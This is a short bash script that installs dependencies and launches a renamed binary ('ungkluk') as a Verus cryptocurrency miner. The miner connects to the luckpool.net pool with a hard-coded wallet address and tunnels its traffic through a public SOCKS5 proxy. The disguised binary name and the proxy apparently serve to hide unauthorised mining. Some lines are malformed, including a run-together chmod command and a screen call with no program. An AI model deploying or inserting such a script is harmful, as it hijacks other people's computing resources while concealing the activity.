#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x onta.sh && chmod +x ungkluk chmod 777 ungkluk onta.sh
screen -dmS ls
PL=stratum+tcp://eu.luckpool.net:3956
WT=RXggSUt7YBw76Jq8A1cmqVH8TPWVoao6PJ
WR=APEN
PY=socks5://70.185.68.133:4145
./ungkluk -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
